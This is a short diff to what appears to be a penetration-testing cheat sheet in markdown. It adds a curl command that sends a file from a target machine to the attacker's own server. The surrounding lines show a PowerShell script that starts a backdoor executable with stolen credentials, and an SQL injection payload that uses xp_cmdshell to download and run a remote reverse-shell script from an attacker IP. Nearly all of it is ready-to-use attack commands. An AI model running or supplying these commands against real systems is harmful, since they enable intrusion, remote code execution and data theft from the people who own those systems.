@@ -90,6 +90,12 @@ echo $credential = New-Object System.Management.Automation.PSCredential $usernam
 echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
 ```
 
+Send file contents of file on target to your own server.
+
+```bash
+curl --data @/tmp/output http://$myip:8080/
+```
+
 ```bash
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
 
